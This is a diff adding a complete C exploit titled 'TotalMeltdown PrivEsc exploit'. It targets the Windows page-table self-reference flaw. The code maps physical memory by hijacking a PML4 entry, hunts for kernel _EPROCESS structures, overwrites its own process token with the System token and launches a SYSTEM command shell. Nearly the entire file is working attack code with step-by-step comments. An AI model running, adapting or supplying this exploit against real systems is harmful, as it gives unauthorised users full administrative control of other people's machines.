@@ -1,0 +1,353 @@
+#include "stdafx.h"
+
+#define	PML4_BASE	0xFFFFF6FB7DBED000
+#define	PDP_BASE	0xFFFFF6FB7DA00000
+#define	PD_BASE		0xFFFFF6FB40000000
+#define	PT_BASE	0xFFFFF68000000000
+
+typedef LARGE_INTEGER PHYSICAL_ADDRESS, *PPHYSICAL_ADDRESS;
+
+#pragma pack(push,4)
+typedef struct _CM_PARTIAL_RESOURCE_DESCRIPTOR {
+	UCHAR Type;
+	UCHAR ShareDisposition;
+	USHORT Flags;
+	union {
+		struct {
+			PHYSICAL_ADDRESS Start;
+			ULONG Length;
+		} Generic;
+
+		struct {
+			PHYSICAL_ADDRESS Start;
+			ULONG Length;
+		} Port;
+
+		struct {
+#if defined(NT_PROCESSOR_GROUPS)
+			USHORT Level;
+			USHORT Group;
+#else
+			ULONG Level;
+#endif
+			ULONG Vector;
+			KAFFINITY Affinity;
+		} Interrupt;
+
+		struct {
+			union {
+				struct {
+#if defined(NT_PROCESSOR_GROUPS)
+					USHORT Group;
+#else
+					USHORT Reserved;
+#endif
+					USHORT MessageCount;
+					ULONG Vector;
+					KAFFINITY Affinity;
+				} Raw;
+
+				struct {
+#if defined(NT_PROCESSOR_GROUPS)
+					USHORT Level;
+					USHORT Group;
+#else
+					ULONG Level;
+#endif
+					ULONG Vector;
+					KAFFINITY Affinity;
+				} Translated;
+			} DUMMYUNIONNAME;
+		} MessageInterrupt;
+
+		struct {
+			PHYSICAL_ADDRESS Start; 
+			ULONG Length;
+		} Memory;
+
+		struct {
+			ULONG Channel;
+			ULONG Port;
+			ULONG Reserved1;
+		} Dma;
+
+		struct {
+			ULONG Channel;
+			ULONG RequestLine;
+			UCHAR TransferWidth;
+			UCHAR Reserved1;
+			UCHAR Reserved2;
+			UCHAR Reserved3;
+		} DmaV3;
+
+		struct {
+			ULONG Data[3];
+		} DevicePrivate;
+
+		struct {
+			ULONG Start;
+			ULONG Length;
+			ULONG Reserved;
+		} BusNumber;
+
+		struct {
+			ULONG DataSize;
+			ULONG Reserved1;
+			ULONG Reserved2;
+		} DeviceSpecificData;
+
+		struct {
+			PHYSICAL_ADDRESS Start;
+			ULONG Length40;
+		} Memory40;
+
+		struct {
+			PHYSICAL_ADDRESS Start;
+			ULONG Length48;
+		} Memory48;
+
+		struct {
+			PHYSICAL_ADDRESS Start;
+			ULONG Length64;
+		} Memory64;
+
+		struct {
+			UCHAR Class;
+			UCHAR Type;
+			UCHAR Reserved1;
+			UCHAR Reserved2;
+			ULONG IdLowPart;
+			ULONG IdHighPart;
+		} Connection;
+
+	} u;
+} CM_PARTIAL_RESOURCE_DESCRIPTOR, *PCM_PARTIAL_RESOURCE_DESCRIPTOR;
+#pragma pack(pop,4)
+
+typedef enum _INTERFACE_TYPE {
+	InterfaceTypeUndefined,
+	Internal,
+	Isa,
+	Eisa,
+	MicroChannel,
+	TurboChannel,
+	PCIBus,
+	VMEBus,
+	NuBus,
+	PCMCIABus,
+	CBus,
+	MPIBus,
+	MPSABus,
+	ProcessorInternal,
+	InternalPowerBus,
+	PNPISABus,
+	PNPBus,
+	Vmcs,
+	ACPIBus,
+	MaximumInterfaceType
+} INTERFACE_TYPE, *PINTERFACE_TYPE;
+
+typedef struct _CM_PARTIAL_RESOURCE_LIST {
+	USHORT                         Version;
+	USHORT                         Revision;
+	ULONG                          Count;
+	CM_PARTIAL_RESOURCE_DESCRIPTOR PartialDescriptors[1];
+} CM_PARTIAL_RESOURCE_LIST, *PCM_PARTIAL_RESOURCE_LIST;
+
+typedef struct _CM_FULL_RESOURCE_DESCRIPTOR {
+	INTERFACE_TYPE           InterfaceType;
+	ULONG                    BusNumber;
+	CM_PARTIAL_RESOURCE_LIST PartialResourceList;
+} *PCM_FULL_RESOURCE_DESCRIPTOR, CM_FULL_RESOURCE_DESCRIPTOR;
+
+typedef struct _CM_RESOURCE_LIST {
+	ULONG                       Count;
+	CM_FULL_RESOURCE_DESCRIPTOR List[1];
+} *PCM_RESOURCE_LIST, CM_RESOURCE_LIST;
+
+struct memory_region {
+	ULONG64 size;
+	ULONG64 address;
+};
+
+// Very hack'y way of trying to map out physical memory regions to try and reduce
+// risk of BSOD
+DWORD parse_memory_map(struct memory_region *regions) {
+	HKEY hKey = NULL;
+	LPTSTR pszSubKey = L"Hardware\\ResourceMap\\System Resources\\Physical Memory";
+	LPTSTR pszValueName = L".Translated";
+	LPBYTE lpData = NULL;
+	DWORD dwLength = 0, count = 0, type = 0;;
+
+	if (!RegOpenKey(HKEY_LOCAL_MACHINE, pszSubKey, &hKey) == ERROR_SUCCESS)
+	{
+		printf("[*] Could not get reg key\n");
+		return 0;
+	}
+
+	if (!RegQueryValueEx(hKey, pszValueName, 0, &type, NULL, &dwLength) == ERROR_SUCCESS)
+	{
+		printf("[*] Could not query hardware key\n");
+		return 0;
+	}
+
+	lpData = (LPBYTE)malloc(dwLength);
+	RegQueryValueEx(hKey, pszValueName, 0, &type, lpData, &dwLength);
+
+	CM_RESOURCE_LIST *resource_list = (CM_RESOURCE_LIST *)lpData;
+
+	for (int i = 0; i < resource_list->Count; i++) {
+		for (int j = 0; j < resource_list->List[0].PartialResourceList.Count; j++) {
+			if (resource_list->List[i].PartialResourceList.PartialDescriptors[j].Type == 3) {
+				regions->address = resource_list->List[i].PartialResourceList.PartialDescriptors[j].u.Memory.Start.QuadPart;
+				regions->size = resource_list->List[i].PartialResourceList.PartialDescriptors[j].u.Memory.Length;
+				regions++;
+				count++;
+			}
+		}
+	}
+
+	return count;
+}
+
+int main()
+{
+	printf("TotalMeltdown PrivEsc exploit by @_xpn_\n");
+	printf("  paging code by @UlfFrisk\n\n");
+
+	unsigned long long iPML4, vaPML4e, vaPDPT, iPDPT, vaPD, iPD;
+	DWORD done;
+	DWORD count;
+
+	// Parse registry for physical memory regions
+	printf("[*] Getting physical memory regions from registry\n");
+	struct memory_region *regions = (struct memory_region *)malloc(sizeof(struct memory_region) * 10);
+
+	count = parse_memory_map(regions);
+	if (count == 0) {
+		printf("[X] Could not find physical memory region, quitting\n");
+		return 2;
+	}
+
+	for (int i = 0; i < count; i++) {
+		printf("[*] Phyiscal memory region found: %p - %p\n", regions[i].address, regions[i].address + regions[i].size);
+	}
+
+	// Check for vulnerability
+	__try {
+		int test = *(unsigned long long *)PML4_BASE;
+	}
+	__except (EXCEPTION_EXECUTE_HANDLER) {
+		printf("[X] Could not access PML4 address, system likely not vulnerable\n");
+		return 2;
+	}
+
+	// setup: PDPT @ fixed hi-jacked physical address: 0x10000
+	// This code uses the PML4 Self-Reference technique discussed, and iterates until we find a "free" PML4 entry
+	// we can hijack.
+	for (iPML4 = 256; iPML4 < 512; iPML4++) {
+		vaPML4e = PML4_BASE + (iPML4 << 3);
+		if (*(unsigned long long *)vaPML4e) { continue; }
+
+		// When we find an entry, we add a pointer to the next table (PDPT), which will be
+		// stored at the physical address 0x10000
+		*(unsigned long long *)vaPML4e = 0x10067;
+		break;
+	}
+	printf("[*] PML4 Entry Added At Index: %d\n", iPML4);
+
+	// Here, the PDPT table is referenced via a virtual address.
+	// For example, if we added our hijacked PML4 entry at index 256, this virtual address
+	// would be 0xFFFFF6FB7DA00000 + 0x100000
+	// This allows us to reference the physical address 0x10000 as:
+	// PML4 Index: 1ed | PDPT Index : 1ed |	PDE Index : 1ed | PT Index : 100
+	vaPDPT = PDP_BASE + (iPML4 << (9 * 1 + 3));
+	printf("[*] PDPT Virtual Address: %p", vaPDPT);
+
+	// 2: setup 31 PDs @ physical addresses 0x11000-0x1f000 with 2MB pages
+	// Below is responsible for adding 31 entries to the PDPT
+	for (iPDPT = 0; iPDPT < 31; iPDPT++) {
+		*(unsigned long long *)(vaPDPT + (iPDPT << 3)) = 0x11067 + (iPDPT << 12);
+	}
+
+	// For each of the PDs, a further 512 PT's are created. This gives access to
+	// 512 * 32 * 2mb = 33gb physical memory space
+	for (iPDPT = 0; iPDPT < 31; iPDPT++) {
+		if ((iPDPT % 3) == 0)
+			printf("\n[*] PD Virtual Addresses: ");
+
+		vaPD = PD_BASE + (iPML4 << (9 * 2 + 3)) + (iPDPT << (9 * 1 + 3));
+		printf("%p ", vaPD);
+
+		for (iPD = 0; iPD < 512; iPD++) {
+			// Below, notice the 0xe7 flags added to each entry.
+			// This is used to create a 2mb page rather than the standard 4096 byte page.
+			*(unsigned long long *)(vaPD + (iPD << 3)) = ((iPDPT * 512 + iPD) << 21) | 0xe7;
+		}
+	}
+
+	printf("\n[*] Page tables created, we now have access to ~31gb of physical memory\n");
+
+	#define EPROCESS_IMAGENAME_OFFSET 0x2e0
+	#define EPROCESS_TOKEN_OFFSET 0x208
+	#define EPROCESS_PRIORITY_OFFSET 0xF  // This is the offset from IMAGENAME, not from base
+
+	unsigned long long ourEPROCESS = 0, systemEPROCESS = 0;
+	unsigned long long exploitVM = 0xffff000000000000 + (iPML4 << (9 * 4 + 3));
+	STARTUPINFOA si;
+	PROCESS_INFORMATION pi;
+	
+	ZeroMemory(&si, sizeof(si));
+	si.cb = sizeof(si);
+	ZeroMemory(&pi, sizeof(pi));
+
+	printf("[*] Hunting for _EPROCESS structures in memory\n");
+
+	for (int j = 0; j < count; j++) {
+		printf("[*] Trying physical region %p - %p\n", regions[j].address, regions[j].address + regions[j].size);
+
+		for (unsigned long long i = regions[j].address; i < +regions[j].address + regions[j].size; i++) {
+			
+			__try {
+				// Locate EPROCESS via the IMAGE_FILE_NAME field, and PRIORITY_CLASS field
+				if (ourEPROCESS == 0 && memcmp("TotalMeltdownP", (unsigned char *)(exploitVM + i), 14) == 0) {
+					if (*(unsigned char *)(exploitVM + i + EPROCESS_PRIORITY_OFFSET) == 0x2) {
+						ourEPROCESS = exploitVM + i - EPROCESS_IMAGENAME_OFFSET;
+						printf("[*] Found our _EPROCESS at %p\n", ourEPROCESS);
+					}
+				}
+				// Locate EPROCESS via the IMAGE_FILE_NAME field, and PRIORITY_CLASS field
+				else if (systemEPROCESS == 0 && memcmp("System\0\0\0\0\0\0\0\0\0", (unsigned char *)(exploitVM + i), 14) == 0) {
+					if (*(unsigned char *)(exploitVM + i + EPROCESS_PRIORITY_OFFSET) == 0x2) {
+						systemEPROCESS = exploitVM + i - EPROCESS_IMAGENAME_OFFSET;
+						printf("[*] Found System _EPROCESS at %p\n", systemEPROCESS);
+					}
+				}
+
+				if (systemEPROCESS != 0 && ourEPROCESS != 0) {
+					// Swap the tokens by copying the pointer to System Token field over our process token
+					printf("[*] Copying access token from %p to %p\n", systemEPROCESS + EPROCESS_TOKEN_OFFSET, ourEPROCESS + EPROCESS_TOKEN_OFFSET);
+					*(unsigned long long *)((char *)ourEPROCESS + EPROCESS_TOKEN_OFFSET) = *(unsigned long long *)((char *)systemEPROCESS + EPROCESS_TOKEN_OFFSET);
+					printf("[*] Done, spawning SYSTEM shell...\n\n");
+
+					CreateProcessA(0,
+						"cmd.exe",
+						NULL,
+						NULL,
+						TRUE,
+						0,
+						NULL,
+						"C:\\windows\\system32",
+						&si,
+						&pi);
+					break;
+				}
+			}
+			__except (EXCEPTION_EXECUTE_HANDLER) {
+				printf("[X] Exception occured, stopping to avoid BSOD\n");
+				return 2;
+			}
+		}
+	}
+    return 0;
+}
